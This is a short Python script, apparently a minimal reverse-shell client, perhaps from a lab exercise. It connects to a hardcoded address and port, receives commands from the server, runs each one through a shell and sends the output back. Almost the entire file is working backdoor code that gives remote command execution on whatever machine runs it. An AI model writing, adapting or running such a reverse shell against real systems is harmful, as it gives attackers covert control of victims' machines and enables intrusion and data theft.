import socket, subprocess

def main():
    # Spawn a socket to read orders from the server
    rev_sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect back to the hardcoded address
    rev_sck.connect(('127.0.0.1', 5001))

    try:
        while True:
            # Read a commad to execute
            cmd = rev_sck.recv(8148).decode()

            # This combination is an EOF, i.e., the server has been taken down
            # so we'll just quit as well.
            if cmd == '':
                rev_sck.close()
                exit(0)
            # Otherwise run the command and send it back to the server
            rev_sck.sendall(subprocess.check_output(cmd, shell = True))
    # When debugging we used CTRL + C to stop the program's execution
    except KeyboardInterrupt:
        rev_sck.close()
        exit(0)
# Run the client!
main()